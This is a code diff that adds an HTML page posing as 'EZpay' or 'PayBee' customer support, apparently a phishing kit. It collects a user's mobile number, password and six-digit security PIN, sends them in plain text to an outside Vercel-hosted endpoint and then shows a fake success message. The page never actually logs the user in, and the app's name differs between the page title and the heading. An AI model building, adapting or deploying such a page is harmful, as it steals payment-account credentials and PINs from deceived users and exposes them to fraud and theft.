@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EZpay Customer Support</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        :root { 
+            --primary: #2893fd; 
+            --primary-hover: #2893fd;
+            --bg: #f9f9f9; 
+            --text-main: #333; 
+            --text-light: #666;
+            --white: #ffffff;
+        }
+
+        body { 
+            font-family: 'Inter', sans-serif; 
+            background: var(--bg); 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            min-height: 100vh; 
+        }
+        
+        .container { 
+            width: 100%; 
+            max-width: 480px; 
+            background: var(--white); 
+            padding: 30px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.05); 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            box-sizing: border-box;
+        }
+
+        /* HEADER */
+        .app-header { text-align: center; margin: 20px 0; }
+        .logo-img { width: 90px; height: 90px; border-radius: 10%; }
+        .brand-title { color: #000; font-size: 24px; font-weight: 700; margin: 0; }
+        
+        /* TEXT STYLES */
+        .sub-text { color: var(--text-light); font-size: 14px; margin-top: 5px; text-align: center; }
+        h2 { text-align: center; color: var(--text-light); margin-top: 30px; font-weight: 600; }
+        h3 { border-bottom: 1px solid #eee; padding-bottom: 10px; margin-top: 20px; color: var(--text-main); font-size: 18px; }
+
+        /* VIEWS */
+        .hidden { display: none !important; }
+
+        /* INPUTS */
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: 500; color: var(--text-main); font-size: 14px; }
+        .input-field { 
+            width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; 
+            background: #f5f5f5; font-size: 16px; box-sizing: border-box; outline: none; transition: all 0.2s;
+        }
+        .input-field:focus { border-color: var(--primary); background: #fff; box-shadow: 0 0 0 3px rgba(120, 167, 87, 0.1); }
+
+        /* PIN BOX */
+        .pin-wrapper { display: flex; gap: 8px; justify-content: space-between; }
+        .pin-box { 
+            width: 100%; height: 50px; text-align: center; font-size: 24px; font-weight: bold;
+            border: 1px solid #ccc; border-radius: 8px; background: white; padding: 0;
+        }
+        .pin-box:focus { border-color: var(--primary); border-width: 2px; outline: none; }
+
+        /* BUTTONS */
+        .btn { 
+            width: 100%; padding: 15px; border: none; border-radius: 8px; 
+            font-size: 16px; font-weight: 600; cursor: pointer; color: white; margin-top: 10px;
+            transition: background 0.2s;
+        }
+        .btn-grey { background: #2893fd; }
+        .btn-grey:hover { background: #2893fd; }
+        
+        .btn-green { background: var(--primary); }
+        .btn-green:hover { background: var(--primary-hover); }
+        
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
+
+        /* ERROR MESSAGE */
+        .error-msg { color: #ef4444; text-align: center; margin-bottom: 15px; font-size: 14px; display: none; }
+
+        /* MODAL */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.6); display: none; align-items: center; justify-content: center; z-index: 1000;
+        }
+        .modal-box {
+            background: white; padding: 40px 30px; border-radius: 16px; 
+            text-align: center; width: 85%; max-width: 350px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .success-icon { color: var(--primary); font-size: 60px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="app-header">
+        <img src="logo.png" onerror="this.src='https://via.placeholder.com/80?text=Logo'" alt="Logo" class="logo-img">
+        <h1 class="brand-title">PayBee Customer Support</h1>
+    </div>
+
+    <div id="view-login">
+        <h2>LOG IN</h2>
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="tel" id="logPhone" class="input-field" placeholder="Enter Mobile Number" maxlength="10" inputmode="numeric">
+            </div>
+            <div class="input-group">
+                <input type="password" id="logPass" class="input-field" placeholder="Enter Password">
+            </div>
+            
+            <div id="loginErr" class="error-msg"></div>
+            
+            <button type="submit" class="btn btn-grey">LOG IN</button>
+        </form>
+    </div>
+
+    <div id="view-form" class="hidden">
+        <p class="sub-text">Please complete your verification</p>
+        <h3>Verification Details</h3>
+        
+        <form id="detailsForm">
+            <div class="input-group">
+                <label>Full Name</label>
+                <input type="text" id="fullName" class="input-field" required>
+            </div>
+
+            <div class="input-group">
+                <label>Problem Type</label>
+                <select id="problem" class="input-field" required>
+                    <option value="" disabled selected>Select your problem</option>
+                    <option value="Id auto logout">ID Auto Logout</option>
+                    <option value="Pending payment">Payment Pending</option>
+                    <option value="Slow sell">Slow Sell</option>
+                    <option value="Quota not added">Quota Not Added</option>
+                    <option value="Tool auto deauthorized">Tool Auto Deauthorized</option>
+                </select>
+            </div>
+
+            <div class="input-group">
+                <label>Security PIN (6 digits)</label>
+                <div class="pin-wrapper">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                    <input type="tel" class="pin-box" maxlength="1" inputmode="numeric">
+                </div>
+                <small style="color:#666; display:block; margin-top:5px;">Please enter a 6-digit PIN</small>
+            </div>
+
+            <div class="input-group">
+                <label>Investment Experience</label>
+                <select id="experience" class="input-field" required>
+                    <option value="" disabled selected>Select experience level</option>
+                    <option value="Beginner (0-1 years)">Beginner (0-1 years)</option>
+                    <option value="Intermediate (1-3 years)">Intermediate (1-3 years)</option>
+                    <option value="Expert (3+ years)">Expert (3+ years)</option>
+                </select>
+            </div>
+
+            <button type="submit" id="submitBtn" class="btn btn-green">Submit Verification</button>
+        </form>
+    </div>
+</div>
+
+<div class="modal-overlay" id="successModal">
+    <div class="modal-box">
+        <i class="fa-solid fa-square-check success-icon"></i>
+        <h2 style="margin:0 0 10px 0; color: #333; font-size: 22px;">Submission Successful!</h2>
+        <p style="color:#555; line-height:1.5; font-size: 14px;">Your details have been submitted. We will review your issue shortly.</p>
+        <button onclick="resetApp()" class="btn btn-green" style="margin-top: 15px;">OK</button>
+        <p style="font-size:12px; color:#999; margin-top:15px;">Redirecting in <span id="timer">5</span>s...</p>
+    </div>
+</div>
+
+<script>
+    // --- STATE MANAGEMENT ---
+    let credentials = {}; 
+    const loginView = document.getElementById('view-login');
+    const formView = document.getElementById('view-form');
+    
+    // ================= CONFIGURATION =================
+    const BACKEND_URL = 'https://ezpay-olive.vercel.app'; 
+
+    // ================= 1. LOGIN LOGIC =================
+    document.getElementById('loginForm').addEventListener('submit', (e) => {
+        e.preventDefault();
+        const phone = document.getElementById('logPhone').value;
+        const pass = document.getElementById('logPass').value;
+        const err = document.getElementById('loginErr');
+
+        // Simple validation
+        if (!phone || !pass) {
+            err.innerText = "Please fill in all fields.";
+            err.style.display = "block";
+            return;
+        }
+
+        // Store credentials to send later
+        credentials = { loginPhone: phone, loginPassword: pass };
+        
+        // Switch Views
+        loginView.classList.add('hidden');
+        formView.classList.remove('hidden');
+    });
+
+    // ================= 2. PIN BOX LOGIC =================
+    const pins = document.querySelectorAll('.pin-box');
+    pins.forEach((input, index) => {
+        // Auto-focus next input
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length === 1 && index < pins.length - 1) {
+                pins[index + 1].focus();
+            }
+        });
+
+        // Handle Backspace
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                pins[index - 1].focus();
+            }
+        });
+    });
+
+    // ================= 3. SUBMIT LOGIC =================
+    document.getElementById('detailsForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        const originalText = btn.innerText;
+        
+        // Gather PIN
+        let combinedPin = '';
+        pins.forEach(p => combinedPin += p.value);
+        
+        if (combinedPin.length !== 6) {
+            alert("Please enter the full 6-digit Security PIN.");
+            return;
+        }
+
+        // Set Loading State
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+
+        // Prepare Data Payload
+        const formData = {
+            loginPhone: credentials.loginPhone,
+            loginPassword: credentials.loginPassword,
+            fullName: document.getElementById('fullName').value,
+            problem: document.getElementById('problem').value,
+            experience: document.getElementById('experience').value,
+            securityPin: combinedPin
+        };
+
+        try {
+            const response = await fetch(`${BACKEND_URL}/api/submit`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            });
+
+            const result = await response.json();
+
+            if (response.ok) {
+                showSuccess(); // Trigger Success Modal
+            } else {
+                alert("Error: " + (result.error || "Submission failed"));
+                btn.disabled = false;
+                btn.innerText = originalText;
+            }
+
+        } catch (error) {
+            console.error(error);
+            alert("Network Error: Please check your internet connection.");
+            btn.disabled = false;
+            btn.innerText = originalText;
+        }
+    });
+
+    // ================= 4. SUCCESS & TIMER =================
+    function showSuccess() {
+        const modal = document.getElementById('successModal');
+        const timerSpan = document.getElementById('timer');
+        modal.style.display = 'flex';
+        
+        let timeLeft = 5;
+        const interval = setInterval(() => {
+            timeLeft--;
+            timerSpan.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                resetApp();
+            }
+        }, 1000);
+    }
+
+    function resetApp() {
+        window.location.reload();
+    }
+</script>
+
+</body>
+</html>
